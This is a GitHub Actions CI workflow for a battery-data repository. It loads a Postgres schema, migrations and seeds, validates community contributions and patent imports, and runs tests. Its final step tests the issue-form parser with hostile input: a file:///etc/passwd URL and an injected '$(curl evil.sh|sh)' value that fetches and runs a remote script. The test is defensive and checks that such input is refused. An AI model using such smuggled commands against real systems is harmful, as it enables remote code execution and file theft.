name: ci
# Every pull request runs once, and main runs once after a merge. Pushing to a
# branch that has an open PR used to run everything twice; a second push while
# the first run was still going kept both alive. Together those were most of the
# Actions minutes this repository spent. Jobs also skip when nothing they test
# changed: a docs-only PR does not need a Postgres service.
on:
  push:
    branches: [main]
  pull_request:

concurrency:
  group: ci-${{ github.workflow }}-${{ github.event.pull_request.number || github.ref }}
  cancel-in-progress: true

permissions:
  contents: read

jobs:
  changes:
    runs-on: ubuntu-latest
    outputs:
      schema: ${{ steps.f.outputs.schema }}
      contrib: ${{ steps.f.outputs.contrib }}
      code: ${{ steps.f.outputs.code }}
    steps:
      - uses: actions/checkout@v4
      - id: f
        shell: bash
        run: |
          # On main, run everything; on a PR, only what the diff touches.
          if [ "${{ github.event_name }}" != "pull_request" ]; then
            for k in schema contrib code; do echo "$k=true" >> "$GITHUB_OUTPUT"; done; exit 0; fi
          # Shallow checkout: compare trees (two dots), which needs no merge base.
          # HEAD is the PR merge commit, so base..HEAD is exactly the PR's files.
          git fetch -q origin "${{ github.base_ref }}" --depth=1
          git diff --name-only "origin/${{ github.base_ref }}" HEAD > "$RUNNER_TEMP/changed"
          sed "s/^/  /" "$RUNNER_TEMP/changed"
          # grep the file, not a pipe: under pipefail, `echo | grep -q` can
          # report the writer's SIGPIPE as a failure and turn a match into false.
          m() { if grep -Eq "$1" "$RUNNER_TEMP/changed"; then echo true; else echo false; fi; }
          echo "schema=$(m '^(schema|seed|migrations|tests/(010|020|ci_)|tools/(load_|export_crosswalk|build_db)|setup.sh|contrib/|patents/|\.github/workflows/ci.yml)')" >> "$GITHUB_OUTPUT"
          echo "contrib=$(m '^(contrib/|review/|components/|catalog/|json-schema/|web/|tools/|tests/|agents/|patents/|technology/|\.github/)')" >> "$GITHUB_OUTPUT"
          echo "code=$(m '^(tools/|tests/|web/|json-schema/|schema/010_vocabulary.sql|\.github/)')" >> "$GITHUB_OUTPUT"

  schema:
    needs: changes
    if: needs.changes.outputs.schema == 'true'
    runs-on: ubuntu-latest
    services:
      postgres:
        image: postgres:16
        env: { POSTGRES_PASSWORD: postgres, POSTGRES_DB: batterydb }
        options: >-
          --health-cmd pg_isready --health-interval 10s
          --health-timeout 5s --health-retries 5
        ports: ['5432:5432']
    env:
      PGHOST: localhost
      PGUSER: postgres
      PGPASSWORD: postgres
    steps:
      - uses: actions/checkout@v4
      - name: One-command setup (what a user actually runs)
        run: |
          ./setup.sh || {
            cat /tmp/bd_contrib.log 2>/dev/null || true
            exit 1
          }
      - name: Load schema
        run: ./tools/build_db.sh batterydb
      - name: Exercise additive BMS migration on the disposable database
        run: |
          psql -v ON_ERROR_STOP=1 -d batterydb -c "ALTER TABLE bd.product_revision DROP COLUMN lifecycle_evidence, DROP COLUMN bms_details; DELETE FROM bd.quantity WHERE code LIKE 'bms_%'; ALTER TABLE bd.product DROP CONSTRAINT product_component_type_check; ALTER TABLE bd.product ADD CONSTRAINT product_component_type_check CHECK (component_type IN ('contactor','fuse','precharge_contactor','precharge_resistor','inverter','dc_dc_converter','charger'));"
          psql -v ON_ERROR_STOP=1 -d batterydb -f migrations/2026-10-09-bms-lifecycle.sql
          psql -v ON_ERROR_STOP=1 -d batterydb -f migrations/2026-10-09-bms-lifecycle.sql
      - name: Load seed data
        run: psql -v ON_ERROR_STOP=1 -d batterydb -f seed/001_reference_cells.sql
      - name: Load packs and valuation seed
        run: psql -v ON_ERROR_STOP=1 -d batterydb -f seed/002_packs_and_valuation.sql
      - name: Load accepted contributions into the library
        # The path from an approved battery to a queryable row, exercised on
        # every push. It is the step most likely to rot silently: contrib/ is
        # edited by contributors and bd.* by schema changes, and nothing else
        # here makes the two meet.
        run: |
          pip install psycopg2-binary pyyaml
          python tools/load_contrib.py --dsn "dbname=batterydb host=localhost user=postgres password=postgres"
          psql -v ON_ERROR_STOP=1 -d batterydb -c "
            DO \$\$
            DECLARE n int;
            BEGIN
              SELECT count(*) INTO n FROM bd.observation o
                JOIN bd.provenance p ON p.id = o.provenance_id
               WHERE p.review_note LIKE 'accepted into contrib/%';
              IF n = 0 THEN
                RAISE EXCEPTION 'contrib/ loaded but no observation reached bd.*';
              END IF;
              RAISE NOTICE 'ok: % contributed observation(s) in the library', n;
            END\$\$;"

      - name: Validate component loading in a rolled-back transaction
        run: python tests/ci_component_loader.py "dbname=batterydb host=localhost user=postgres password=postgres"

      - name: Validate cell chemistry and source locators in a rolled-back transaction
        run: python tests/ci_chemistry_loader.py "dbname=batterydb host=localhost user=postgres password=postgres"

      - name: Validate BMS lifecycle and scoped limits in the database
        run: python tests/ci_bms_loader.py "dbname=batterydb host=localhost user=postgres password=postgres"

      - name: Load patent review corpus into staging
        run: |
          python tools/load_patents.py --dsn "dbname=batterydb host=localhost user=postgres password=postgres"
          python tools/load_epo_patents.py --dsn "dbname=batterydb host=localhost user=postgres password=postgres"
          psql -v ON_ERROR_STOP=1 -d batterydb -c "
            DO \$\$
            DECLARE source_rows int; publication_candidates int; company_candidates int;
                    company_links int; accepted_rows int;
            BEGIN
              SELECT count(*) INTO source_rows FROM bd_stage.patent_observation;
              SELECT count(*) INTO publication_candidates FROM bd_stage.patent_publication_candidate;
              SELECT count(*) INTO company_candidates FROM bd_stage.patent_company_candidate;
              SELECT count(*) INTO company_links FROM bd_stage.patent_publication_company_link;
              SELECT count(*) INTO accepted_rows FROM bd.patent_publication;
              IF source_rows <> 1155 OR publication_candidates <> 1056
                 OR company_candidates <> 383 OR company_links <> 856 THEN
                RAISE EXCEPTION 'patent staging reconciliation failed: % source / % publications / % companies / % links',
                  source_rows, publication_candidates, company_candidates, company_links;
              END IF;
              IF accepted_rows <> 0 THEN
                RAISE EXCEPTION 'unreviewed patent import crossed into accepted tables';
              END IF;
              RAISE NOTICE 'ok: % source rows / % publication / % company / % applicant-link candidates staged',
                source_rows, publication_candidates, company_candidates, company_links;
            END\$\$;"

      - name: Run killer queries
        run: psql -v ON_ERROR_STOP=1 -d batterydb -f tests/010_killer_queries.sql
      - name: Run valuation queries
        run: psql -v ON_ERROR_STOP=1 -d batterydb -f tests/020_valuation_queries.sql
      - name: Assert the schema refuses uninterpretable data
        run: |
          # A bare internal resistance with no conditions MUST fail.
          if psql -q -d batterydb -c "
            INSERT INTO bd.observation
              (product_revision_id, quantity_id, value_native, unit_native, provenance_id)
            SELECT pr.id, q.id, 15, 'mohm', pv.id
              FROM bd.product_revision pr, bd.quantity q, bd.provenance pv
             WHERE q.code='internal_resistance_ac' LIMIT 1;" 2>/dev/null
          then
            echo "FAIL: schema accepted a resistance with no method or conditions"
            exit 1
          fi
          echo "ok: uninterpretable data rejected"
      - name: Refresh graph projection
        run: psql -v ON_ERROR_STOP=1 -d batterydb -c "SELECT bd_graph.refresh();"
      - name: Export the standards crosswalk
        run: python tools/export_crosswalk.py batterydb

  units:
    needs: changes
    if: needs.changes.outputs.code == 'true'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with: { python-version: '3.11' }
      - run: pip install pandas numpy scipy openpyxl pyyaml jsonschema
      - name: Cycler adapters - sniff, normalise, conventions, RPT segmentation
        run: python tools/cyclers.py selftest
      - name: Specification display and Markdown preserve multiple ratings
        run: node tests/test_web_observations.cjs
      - name: Python regression tests
        run: python -m unittest discover -s tests -p 'test_*.py'

  contrib:
    needs: changes
    if: needs.changes.outputs.contrib == 'true'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with: { python-version: '3.11' }
      - run: pip install pyyaml jsonschema
      - name: Validate community contributions
        run: |
          python tools/validate_contrib.py contrib/
          # A pending candidate has to clear the contribution schema too, not
          # just the lighter review rules. Approval promotes the file as-is, so
          # anything the schema rejects turns a checked box into a failed run,
          # and the owner finds that out from a red cross instead of from CI.
          python tools/validate_contrib.py review/candidates/
          python tools/validate_contrib.py review/revisions/
          python tools/validate_review.py
          python tools/check_duplicates.py
          python tools/import_battery_components.py --check
          python tools/import_chemistry_cells.py --check
          python tools/validate_patents.py
          python tools/validate_epo_patents.py
          python tools/check_patent_duplicates.py --fail-on exact
          python tools/import_epo_linked_patents.py \
            --input patents/imports/epo-linked-data-2026-09-04/source \
            --output patents/imports/epo-linked-data-2026-09-04
          git diff --exit-code -- patents/imports/epo-linked-data-2026-09-04 || {
            echo "::error::EPO patent/company batch is stale; run the deterministic importer"
            exit 1
          }
          python tools/build_review_batch.py
          python tools/render_review_issues.py
          python tools/build_component_catalog.py --check
          python tools/build_bms_catalog.py --check
          python tools/build_date_catalog.py --check
          python tools/build_browse_catalog.py --check
          git diff --exit-code -- review/ || {
            echo "::error::review batch is stale. Run the deterministic builders"
            exit 1
          }
      - name: The finder's data builds from the contributions
        # web/data/*.json is generated at deploy time (pages.yml) and never
        # committed, so nothing can go stale. What can still break is the
        # build itself: a heading naming a quantity that does not exist, a
        # unit the metrics cannot convert, a record the page cannot index.
        # Build into a scratch directory and fail on any of those.
        run: |
          python tools/build_web_data.py --out "$RUNNER_TEMP/web-data"
          test -s "$RUNNER_TEMP/web-data/cells.json"
      - name: Extraction schema builds from the contribution schema
        # No API key and no network: this checks that the schema the model is
        # forced to fill is still derivable from the schema the validator
        # enforces. If they drift, extraction starts producing files CI then
        # rejects, and the first person to find out is a reviewer.
        run: |
          python - <<'PY'
          import json, sys
          sys.path.insert(0, "tools")
          import jsonschema, extract_datasheet as ed
          reg = json.load(open("json-schema/quantity-registry.json"))
          s = ed.build_schema(reg)
          jsonschema.Draft202012Validator.check_schema(s)
          n = len(s["properties"]["observations"]["items"]["properties"]["quantity"]["enum"])
          assert n == len(reg), f"quantity enum {n} != registry {len(reg)}"
          assert json.dumps(s).count("$ref") == 0, "unresolved $ref in extraction schema"
          print(f"ok: extraction schema offers {n} quantity codes")
          PY
      - name: Issue-form parser handles hostile input
        run: |
          ISSUE_BODY='### Datasheet URL

          file:///etc/passwd

          ### Manufacturer

          $(curl evil.sh|sh)

          ### Model number

          x' python .github/scripts/issue_form.py && {
            echo "FAIL: accepted a file:// datasheet URL"; exit 1; }
          echo "ok: non-http datasheet URL refused"
